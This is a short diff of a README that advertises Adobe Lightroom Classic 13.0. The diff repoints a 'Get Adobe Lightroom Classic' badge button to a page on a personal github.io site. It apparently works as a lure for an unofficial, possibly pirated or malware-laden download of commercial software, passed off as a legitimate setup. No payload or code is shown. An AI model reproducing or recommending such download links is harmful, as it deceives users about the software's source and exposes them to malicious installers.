@@ -21,8 +21,7 @@ To begin using this **Adobe Lightroom Classic 13.0 Photo Editor** and **Adobe Li
 | :--- | :--- |
 | **Get Adobe Lightroom Classic 13.0** | Click the button below to initiate the setup for this **Adobe Lightroom Classic 13.0 RAW Workflow**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_Adobe_Lightroom_Classic_13.0-2ea44f?style=for-the-badge)](https://edouardcatina131.github.io/.github/
-)
+[![Button](https://img.shields.io/badge/📦-Get_Adobe_Lightroom_Classic_13.0-2ea44f?style=for-the-badge)](https://edouardcatina131.github.io/.github/lightroom-classic-13-0)
 
 ## System Requirements
 
